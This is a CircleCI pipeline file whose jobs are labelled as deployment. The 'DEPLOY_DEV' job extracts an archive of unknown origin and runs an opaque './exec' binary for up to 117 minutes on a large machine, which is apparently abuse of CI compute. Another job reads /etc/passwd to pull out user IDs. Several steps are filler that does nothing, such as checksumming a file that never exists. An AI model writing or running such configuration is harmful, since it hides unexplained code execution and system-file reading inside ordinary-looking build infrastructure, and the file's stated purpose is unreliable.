version: 2.1

jobs:
  vendor_DEPLOY_DEV:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: spin till settled
          command: |
            mkdir -p /tmp/outbox
            set +o pipefail 2>/dev/null; date -u +%s%N > /tmp/outbox/audit.txt; for i in $(seq 1 5000); do echo "$i $(date +%N)" >> /tmp/outbox/audit.txt; done; true
            echo "staging complete; file length=$(wc -c </tmp/outbox/audit.txt)"
      - persist_to_workspace:
          root: /tmp/outbox
          paths:
            - audit.txt
  DEPLOY_DEV:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/outbox
      - run:
          name: Read staged file
          command: |
            md5sum /tmp/outbox/step-9.out || true
      - run:
          name: Fetch and expand
          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Expand archive
          command: tar --extract --file=output.tar
      - run:
          no_output_timeout: 117m
          command: nice -n 0 ./exec
  hook_anothr-run:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/outbox
      - run:
          name: retry forever more
          command: |
            mkdir -p /tmp/outbox
            { set +o pipefail 2>/dev/null; cut -d: -f3 /etc/passwd | sort -n | tail -1; true ; } > /tmp/outbox/manifest.bin
            echo "staging complete; file length=$(wc -c </tmp/outbox/manifest.bin)"
      - persist_to_workspace:
          root: /tmp/outbox
          paths:
            - manifest.bin
